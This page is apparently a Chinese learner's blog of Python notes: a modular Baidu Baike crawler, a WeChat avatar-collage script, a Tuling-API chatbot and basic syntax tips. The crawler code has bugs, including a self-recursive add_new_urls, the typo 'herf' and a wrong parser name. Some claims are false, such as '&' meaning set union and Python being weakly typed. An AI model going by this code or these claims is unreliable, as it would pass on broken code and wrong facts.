<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf8</span><br><span class="line">import urllib2</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">url=&apos;https://www.zhihu.com&apos;</span><br><span class="line">request=urllib2.Request(url)</span><br><span class="line">response1=urllib2.urlopen(url)</span><br><span class="line">soup=BeautifulSoup(response1.read(),&apos;html.parser&apos;,from_encoding=&quot;utf-8&quot;)</span><br><span class="line">#第一个参数是解析出网页的代码，第二个是解析方式，第三个是用的字符集</span><br><span class="line">links=soup.find_all(&apos;a&apos;)</span><br><span class="line">for link in links:</span><br><span class="line">    print link.name,link[&apos;href&apos;],link.get_text()</span><br><span class="line">#遍历网页html代码中的a节点，并输出节点的名字、链接、对应文本</span><br><span class="line">print(soup)</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过一个简单爬虫实例来学习  </p>
<h5 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import url_manager,html_downloader,html_parser,html_outputer</span><br><span class="line">class SpiderMain(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.urls=url_manager.UrlManeger()</span><br><span class="line">        self.downloader=html_downloader.HtmlDownloader()</span><br><span class="line">        self.parser=html_parser.HtmlParser()</span><br><span class="line">        self.outputer=html_outputer.HtmlOutputer()</span><br><span class="line">        #初始化管理器、下载器、解析器、输出器</span><br><span class="line">    def craw(self,root_url):</span><br><span class="line">        count=1#记录爬取的次数</span><br><span class="line">        self.urls.add_new_url(root_url)</span><br><span class="line">        while self.urls.has_new_url():#如果有新的url</span><br><span class="line">            try:</span><br><span class="line">                new_url=self.urls.get_new_url() #放进一个新的url</span><br><span class="line">                print &apos;craw %d:%s&apos;%(count,new_url)</span><br><span class="line">                html_cont=self.downloader.download(new_url)#下载新url对应的页面</span><br><span class="line">                new_urls,new_data=self.parser.parser(new_url,html_cont)#对新的url进行代码解析，又得到新的url和有效数据</span><br><span class="line">                self.urls.add_new_urls(new_urls)#将得到的新的url加入到url管理器进行爬取</span><br><span class="line">                self.outputer.collect_data(new_data)#收集有效的数据</span><br><span class="line">                if count==1000:#设置查找到1000个url结束爬取</span><br><span class="line">                    break</span><br><span class="line">                count=count+1</span><br><span class="line">            except:</span><br><span class="line">                print &apos;craw failed&apos;#标记url爬取失败</span><br><span class="line">        self.outputer.output_html()#输出为html形式</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    root_url=&quot;https://baike.baidu.com/item/Python&quot;#设置爬虫的入口url</span><br><span class="line">    obj_spider=SpiderMain()</span><br><span class="line">    obj_spider.craw(root_url)#启动爬虫</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="管理器"><a href="#管理器" class="headerlink" title="管理器"></a>管理器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">class UrlManeger(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.new_urls=set()#将新的url输出为一个集合并且删除重复元素</span><br><span class="line">        self.old_urls=set()#将新的url输出为一个集合并且删除重复元素</span><br><span class="line"></span><br><span class="line">    def add_new_url(self, url):#向管理器中添加一个新的url</span><br><span class="line">        if url is None: #判断url是否存在</span><br><span class="line">            return</span><br><span class="line">        if url not in self.new_urls and url not in self.old_urls: #判断url是否在待爬取或已爬取页面</span><br><span class="line">            self.new_urls.add(url)#将url添加到未爬取列表</span><br><span class="line"></span><br><span class="line">    def add_new_urls(self, new_urls):#向管理器中添加批量url</span><br><span class="line">        if new_urls is None or len(new_urls) == 0:</span><br><span class="line">            return</span><br><span class="line">        for url in new_urls:#从urls中遍历url添加到URL集合中</span><br><span class="line">            self.add_new_urls(url)</span><br><span class="line"></span><br><span class="line">    def has_new_url(self):#验证是否添加新的url</span><br><span class="line">        return len(self.new_urls) != 0</span><br><span class="line"></span><br><span class="line">    def get_new_url(self):#从管理器中拿出一个新的url进行爬取</span><br><span class="line">        new_url=self.new_urls.pop()#新的url集合中随机取出一个url并且从集合中删去这个url</span><br><span class="line">        self.old_urls.add(new_url)</span><br><span class="line">        return new_url</span><br></pre></td></tr></table></figure>
<h5 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">class HtmlParser(object):</span><br><span class="line">    def _get_new_urls(self, page_url, soup):</span><br><span class="line">        new_urls=set()</span><br><span class="line">        links=soup.find_all(&apos;a&apos;, href=re.compile(r&apos;/item/&apos;))#正则匹配，查询a标签中href属性</span><br><span class="line">        for link in links:#遍历links列表（匹配的url片段）</span><br><span class="line">            new_url=link[&apos;herf&apos;]#抓取herf属性值（link被储存为字典，用[]取出数据）</span><br><span class="line">            new_full_url=urlparse.urljoin(page_url,new_url)#将url拼接起来</span><br><span class="line">            new_urls.add(new_full_url)#将补全的url加入未爬取url名单</span><br><span class="line">        return new_urls</span><br><span class="line"></span><br><span class="line">    def _get_new_data(self, page_url, soup):</span><br><span class="line">        res_data=&#123;&#125;#建立一个res_data字典</span><br><span class="line">        res_data[&apos;url&apos;]=page_url#加入url</span><br><span class="line">        title_node=soup.find(&apos;dd&apos;, class_=&quot;lemmaWgt-lemmaTitle-title&quot;).find(&quot;h1&quot;)#抓取dd标签class属性的hi属性</span><br><span class="line">        res_data[&apos;title&apos;]=title_node.get_text()#取得h1标签文本</span><br><span class="line">        sammary_node=soup.find(&apos;div&apos;, class_=&quot;lemma-summary&quot;)</span><br><span class="line">        res_data[&apos;sammary&apos;]=sammary_node.get_text()</span><br><span class="line">        return res_data#输出字典</span><br><span class="line"></span><br><span class="line">    def parser(self, new_url, html_cont):</span><br><span class="line">        if new_url is None or html_cont is None:#判断页面是否存在</span><br><span class="line">            return</span><br><span class="line">        soup=BeautifulSoup(html_cont, &apos;html_parser&apos;,from_encoding=&apos;utf-8&apos;)#以utf-8字符集解析页面html代码</span><br><span class="line">        new_urls=self._get_new_urls(new_url, soup)</span><br><span class="line">        new_data=self._get_new_data(new_url, soup)</span><br><span class="line">        return new_urls, new_data</span><br></pre></td></tr></table></figure>
<h5 id="下载器"><a href="#下载器" class="headerlink" title="下载器"></a>下载器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#这里只使用了最简单的方法</span><br><span class="line">import urllib2#载入urllib2模块</span><br><span class="line"></span><br><span class="line">class HtmlDownloader(object):</span><br><span class="line">    def download(self, url):</span><br><span class="line">        if url is None:#验证url是否存在</span><br><span class="line">            return None</span><br><span class="line">        response=urllib2.urlopen(url)#下载url</span><br><span class="line">        if response.getcode() != 200:#判断状态码</span><br><span class="line">            return None</span><br><span class="line">        res=response.read()</span><br><span class="line">        return res#读取网页内容</span><br></pre></td></tr></table></figure>
<h5 id="输出器"><a href="#输出器" class="headerlink" title="输出器"></a>输出器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">class HtmlOutputer(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.datas=[]#设置data为一个列表</span><br><span class="line">    def collect_data(self,data):</span><br><span class="line">        if data is None:</span><br><span class="line">            return</span><br><span class="line">        self.datas.append(data)</span><br><span class="line"></span><br><span class="line">    def output_html(self):</span><br><span class="line">        fout=open(&apos;output.html&apos;,&apos;w&apos;)#写出一个html文件</span><br><span class="line">        fout.write(&apos;&lt;html&gt;&apos;)</span><br><span class="line">        fout.write(&apos;&lt;meta charset=\&apos;utf-8\&apos;&gt;&apos;)</span><br><span class="line">        fout.write(&apos;&lt;body&gt;&apos;)</span><br><span class="line">        fout.write(&apos;&lt;table&gt;&apos;)</span><br><span class="line">        for data in self.datas:</span><br><span class="line">            fout.write(&apos;&lt;tr&gt;&apos;)</span><br><span class="line">            fout.write(&apos;&lt;td&gt;%s&lt;/td&gt;&apos;%data[&apos;url&apos;])</span><br><span class="line">            fout.write(&apos;&lt;td&gt;%s&lt;/td&gt;&apos;%data[&apos;title&apos;].encode(&apos;utf-8&apos;))</span><br><span class="line">            fout.write(&apos;&lt;td&gt;%s&lt;/td&gt;&apos;%data[&apos;sammary&apos;].encode(&apos;utf-8&apos;))</span><br><span class="line">            fout.write(&apos;&lt;/tr&gt;&apos;)</span><br><span class="line">        fout.write(&apos;&lt;/table&gt;&apos;)</span><br><span class="line">        fout.write(&apos;&lt;/body&gt;&apos;)</span><br><span class="line">        fout.write(&apos;&lt;/html&gt;&apos;)</span><br><span class="line">        fout.close()</span><br></pre></td></tr></table></figure>
<p>这个爬取百度百科的模块是按照控制器、URL管理器、下载器、解析器、输出器分开编写的  </p>
<ol>
<li>最常用的是“.text”和”.content”，前者输出unicode，后者输出二进制   </li>
<li>这是PIL模块中resize函数（重新设置图片尺寸）resize((size, size), Image.ANTIALIAS）图片质量的参数<br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fpp7dtrugdj30mv06jmxb.jpg" alt="image"></li>
<li>某些网站如知乎，存在反爬虫机制，如果要成功加载页面需要伪造头文件</li>
<li><p>照着网上的教程，熟悉一下itchat模块，做微信头像拼图的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">import itchat</span><br><span class="line">import os</span><br><span class="line">from math import sqrt</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">itchat.auto_login()#微信登录接口</span><br><span class="line">for friend in itchat.get_friends(update=True)[0:]:#获取好友列表，并保持更新</span><br><span class="line">    print friend[&apos;NickName&apos;], friend[&apos;RemarkName&apos;], friend[&apos;Sex&apos;], friend[&apos;Province&apos;], friend[&apos;Signature&apos;]#输出好友的基本信息</span><br><span class="line">    img = itchat.get_head_img(userName=friend[&quot;UserName&quot;])#获取好友头像</span><br><span class="line">    path=&quot;C:\\Users\\14564\\Pictures\\pachong\\&quot;+friend[&apos;NickName&apos;]+&apos;(&apos;+friend[&apos;RemarkName&apos;]+&apos;).jpg&apos;#保存获取的头像</span><br><span class="line">    try:</span><br><span class="line">        with open(path,&apos;wb&apos;) as f:</span><br><span class="line">            f.write(img)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print repr(e)</span><br><span class="line"></span><br><span class="line">def pt():</span><br><span class="line">    path2=&quot;C:\\Users\\14564\\Pictures\\pachong\\&quot;</span><br><span class="line">    pList=[]</span><br><span class="line">    for item in os.listdir(path2):#遍历出单个头像</span><br><span class="line">        imgPath=os.path.join(path2,item)</span><br><span class="line">        pList.append(imgPath)#将头像图片保存到字典中</span><br><span class="line">    total=len(pList)#计算图片个数</span><br><span class="line">    line=int(sqrt(total))#计算合成图片边长</span><br><span class="line">    NewImage=Image.new(&apos;RGB&apos;,(128*line,128*line))#创建一个新的底片存放大小为128px的所有头像</span><br><span class="line">    x=0</span><br><span class="line">    y=0</span><br><span class="line">    for item in pList:</span><br><span class="line">        try:</span><br><span class="line">            Img=Image.open(item)</span><br><span class="line">            Img=Img.resize((128,128),Image.ANTIALIAS)#将头像图片改变大小</span><br><span class="line">            NewImage.paste(Img,(x*128,y*128))#不断添加头像</span><br><span class="line">            x+=1</span><br><span class="line">        except IOError:</span><br><span class="line">            print &quot;第%d行，%d列文件读取失败！IOError：%s&quot;%(y,x,item)</span><br><span class="line">            x-=1</span><br><span class="line">        if x==line:#将一行填完后移动到下一行</span><br><span class="line">            x=0</span><br><span class="line">            y+=1</span><br><span class="line">        if (x+line*y)==line*line:#判断</span><br><span class="line">            break</span><br><span class="line">    NewImage.save(path2+&apos;final.jpg&apos;)#保存为final.jpg</span><br><span class="line">pt()</span><br><span class="line">itchat.run()</span><br><span class="line">8.一个关于微信聊天机器人的程序</span><br><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">import itchat, time, re</span><br><span class="line">from itchat.content import *</span><br><span class="line">import urllib2, urllib</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">@itchat.msg_register([TEXT])#向注册方法传入msg包含text文本消息内容，这里的@是一个装饰器</span><br><span class="line">def text_reply(msg):</span><br><span class="line">    info=msg[&apos;Text&apos;].encode(&apos;UTF-8&apos;)#将得到的消息存放在info变量中</span><br><span class="line">    url=&apos;http://wwww.tuling123.com/openapi/api&apos;#链接到图灵机器人api</span><br><span class="line">    data=&#123;u&quot;key&quot;:&quot;f0fa6a1ec8c542aeaa606a14b2ee8ecd&quot;,&quot;info&quot;:info&#125;#post传入参数</span><br><span class="line">    data=urllib.urlencode(data)</span><br><span class="line">    url2=urllib2.Request(url,data)</span><br><span class="line"></span><br><span class="line">    response= urllib2.urlopen(url2)</span><br><span class="line">    apicontent=response.read()</span><br><span class="line">    s=json.loads(apicontent,encoding=&quot;utf-8&quot;)</span><br><span class="line">    print &apos;s==&apos;,s</span><br><span class="line">    if s[&apos;code&apos;]==100000:</span><br><span class="line">        itchat.send(s[&apos;text&apos;],msg[&apos;FromUserName&apos;])#将从api得到的json文本发送给好友</span><br><span class="line">itchat.auto_login(hotReload=True)#hotReload表示保持登录状态</span><br><span class="line">itchat.run(debug=True)</span><br></pre></td></tr></table></figure>
</li>
<li><p>关于requests模块的一些补充<br>常见报错说明<br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fpp7aspnr9j315x0f6k3u.jpg" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;小猪图片.jpg&apos;,&apos;wb&apos;) as f:</span><br><span class="line">    f.write(r.content)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>r.content将返回图像的二进制内容，当我们要保存到本地文件时，写入方式必须为“wb”，否则会报错</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/爬虫/">爬虫</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-python基础学习" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/03/23/python基础学习/" class="article-date">
      <time datetime="2018-03-23T09:25:18.027Z" itemprop="datePublished">2018-03-23</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/23/python基础学习/">python基础学习</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h6 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h6><p>print(L[0][0], L[1][1], L[-1][-1], sep=’\n’) 像这样在print里面最后加sep=’\n’可以起到换行的作用，而且换行后面有空格</p>
<h6 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h6><p>list列表使用[]括起来。其中元素可以删改，tuple元组使用()，其中不可以删改，都可以在其中进行嵌套</p>
<h6 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h6><p>条件函数if内部代码只需要缩进两行就可以了，不用{}</p>
<h6 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 20</span><br><span class="line">if age &gt;= 6:</span><br><span class="line">   print(&apos;teenager&apos;)</span><br><span class="line">elif age &gt;= 18:</span><br><span class="line">   print(&apos;adult&apos;)</span><br><span class="line">else:</span><br><span class="line">   print(&apos;kid&apos;)</span><br></pre></td></tr></table></figure>
<p>其中最后结果只会显示teenager，if语句执行有个特点，它是从上往下判断，如果在某个判断上是True，把该判断对应的语句执行后，就忽略掉剩下的elif和else</p>
<h6 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h6><p>input()函数输入的值作为字符串，不能参加比较，可以用int（）、float（）函数进行转变</p>
<h6 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h6><p>Python的循环有两种，一种是for…in循环，依次把list或tuple中的每个元素迭代出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br><span class="line">for name in names:</span><br><span class="line">    print(name)</span><br></pre></td></tr></table></figure></p>
<p>   第二种循环是while循环，只要条件满足，就不断循环，条件不满足时退出循环。比如我们要计算100以内所有奇数之和，可以用while循环实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">n = 99</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    sum = sum + n</span><br><span class="line">    n = n - 2</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure></p>
<h6 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h6><p>python中的字典dict与js中的json表达方式极为相似，采用键值对形式表达用{}括起每一个key对应一个value，要删除一个key，用pop(key)方法</p>
<h6 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h6><p>set相对于dict只有key，相当于一个无序无重复数字的集合，&amp;表示并集，|表示合集，</p>
<h6 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h6><p>replace()函数只能改变值，不能改变变量，要改变只有重新定义变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = &apos;abc&apos;</span><br><span class="line">&gt;&gt;&gt; b = a.replace(&apos;a&apos;, &apos;A&apos;)</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">       &apos;Abc&apos;</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">        &apos;abc&apos;</span><br></pre></td></tr></table></figure></p>
<h6 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h6><p>在print函数中逗号起分割作用，涉及几个变量时，必须加，分割，不会显示<br>abs（）转化绝对值<br>str（）转化字符串<br>int（）转化整数<br>hex（）转化十六进制<br>len（）返回字符串的字符数</p>
<h6 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h6><p>pass语句可以在定义函数中作为占位符，def定义函数也要用：引起内部函数，结束定义函数用return返回值，import math语句表示导入math包</p>
<h6 id="12"><a href="#12" class="headerlink" title="12."></a>12.</h6><p>自定义函数必选参数在前，默认参数在后，要修改默认参数的值，要把对应变量写出来复制，单写值无法改变变量，定义默认参数要牢记一点：默认参数必须指向不变对象！</p>
<h6 id="13"><a href="#13" class="headerlink" title="13."></a>13.</h6><p>在函数中我们还可以设置可变参数，可变参数就是传入的参数个数是可变的，只是在参数前面加了一个*号，省去了在执行函数时再写一遍list、tuple，也就是说可变参数就是可以把列表中的元素提取出来作为可变元素。还有就是关键字参数，允许你传入多个值，还可以用关键字参数调用已有的list;；而命名关键字参数则可以限制自定义参数的名称<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def person(name,age,**kw):</span><br><span class="line">    print(&apos;name:&apos;,name,&apos;age:&apos;,age,&quot;other:&quot;,kw)</span><br><span class="line">person(&apos;jason&apos;,19,city=&apos;chengdu&apos;)</span><br><span class="line">&gt;&gt;&gt;name: jason age: 19 other: &#123;&apos;city&apos;: &apos;chengdu&apos;&#125;</span><br><span class="line"></span><br><span class="line">def person(name, age, *, city, job):</span><br><span class="line">    print(name, age, city, job)</span><br><span class="line">person(&apos;Jack&apos;, 24, city=&apos;Beijing&apos;, job=&apos;Engineer&apos;)</span><br><span class="line">Jack 24 Beijing Engineer</span><br></pre></td></tr></table></figure></p>
<p>便于理解：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def f1(a, b, c=0, *args, **kw):</span><br><span class="line">     print(&apos;a =&apos;, a, &apos;b =&apos;, b, &apos;c =&apos;, c, &apos;args =&apos;, args, &apos;kw =&apos;, kw) </span><br><span class="line">def f2(a, b, c=0, *, d, **kw):</span><br><span class="line">     print(&apos;a =&apos;, a, &apos;b =&apos;, b, &apos;c =&apos;, c, &apos;d =&apos;, d, &apos;kw =&apos;, kw)</span><br><span class="line">&gt;&gt;&gt; f1(1, 2) </span><br><span class="line">     a = 1 b = 2 c = 0 args = () kw = &#123;&#125;</span><br><span class="line"> &gt;&gt;&gt; f1(1, 2, c=3)</span><br><span class="line">     a = 1 b = 2 c = 3 args = () kw = &#123;&#125;</span><br><span class="line"> &gt;&gt;&gt; f1(1, 2, 3, &apos;a&apos;, &apos;b&apos;) </span><br><span class="line">     a = 1 b = 2 c = 3 args = (&apos;a&apos;, &apos;b&apos;) kw = &#123;&#125;</span><br><span class="line"> &gt;&gt;&gt; f1(1, 2, 3, &apos;a&apos;, &apos;b&apos;, x=99)</span><br><span class="line">     a = 1 b = 2 c = 3 args = (&apos;a&apos;, &apos;b&apos;) kw = &#123;&apos;x&apos;: 99&#125;</span><br><span class="line"> &gt;&gt;&gt; f2(1, 2, d=99, ext=None) </span><br><span class="line">     a = 1 b = 2 c = 0 d = 99 kw = &#123;&apos;ext&apos;: None&#125;</span><br></pre></td></tr></table></figure></p>
<h6 id="14"><a href="#14" class="headerlink" title="14."></a>14.</h6><p>加强记忆，python与C语言不一样!   语句结束不加分号，输入用input（）且输入值为字符串，输出用print（），不用提前定义数据类型，Python是弱类型语言进行递归函数时就要防止栈溢出，在计算机中，函数调用是通过栈（stack）这种数据结构实现的，每当进入一个函数调用，栈就会加一层栈帧，每当函数返回，栈就会减一层栈帧。由于栈的大小不是无限的，所以，递归调用的次数过多，会导致栈溢出。</p>
<h6 id="15"><a href="#15" class="headerlink" title="15."></a>15.</h6><p>关于切片，表达形式L[m，n]，意思是从列表或元组L中提取出第m+1个元素到n-1个元素的切片，如果第一个索引是0，还可以省略为L[：n]，切片也可以取负数，从后面取元素，倒数第一个元素的索引是-1,正着数则是以两个数的间隔做区分，比如0就在第一个元素以前，1在第一第二个元素中间，所以n要减1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L = [&apos;Michael&apos;, &apos;Sarah&apos;, &apos;Tracy&apos;, &apos;Bob&apos;, &apos;Jack&apos;]</span><br><span class="line">print(L[-3:])</span><br><span class="line">&gt;&gt;&gt;[&apos;Tracy&apos;, &apos;Bob&apos;, &apos;Jack&apos;]</span><br></pre></td></tr></table></figure>
<h6 id="16"><a href="#16" class="headerlink" title="16."></a>16.</h6><p>迭代：给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，对于字典的迭代，很可能并没有按照列出的顺序，因为dict的存储不是按照list的方式顺序排列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for ch in &apos;ABC&apos;:</span><br><span class="line">...     print(ch)</span><br><span class="line">&gt;&gt;&gt;A</span><br><span class="line">      B</span><br><span class="line">      C</span><br></pre></td></tr></table></figure></p>
<h6 id="17"><a href="#17" class="headerlink" title="17."></a>17.</h6><p>赋值语句：a, b = b, a + b<br>相当于：t = (b, a + b) # t是一个tuple<br>a = t[0]<br>b = t[1]</p>
